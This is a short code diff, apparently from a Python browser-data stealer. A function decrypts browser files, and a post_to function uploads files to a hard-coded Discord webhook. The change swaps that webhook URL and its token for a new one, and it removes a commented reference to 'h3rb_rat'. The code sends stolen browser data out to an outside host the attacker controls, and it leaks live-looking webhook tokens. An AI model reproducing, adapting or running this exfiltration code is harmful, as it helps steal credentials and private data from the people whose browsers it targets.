@@ -232,7 +232,7 @@ def decrypt_files(path, browser):
 
 # WEBHOOK
 def post_to(file):
-    webhook_url = "https://discordapp.com/api/webhooks/1029476201493958797/vR2135ipqqFNX4nKlRDSPhZ1iA7ReYn2Gvle_o8UscGpr7B6WhngBBrXwE58eIhOrwyG"
+    webhook_url = "https://discord.com/api/webhooks/1095800440458842152/lYo6sDe8DMyjij02ONnQOPBsiR44ek3x0WlLeB1zhhnWKdXpuutV-JzFwwED-sTPRhth"
     if webhook_url == "":  # don't change
         pass
     else:
@@ -262,5 +262,3 @@ def main():
     for i in for_handler:
         file_handler(i)
 main()
-
-# import h3rb_rat
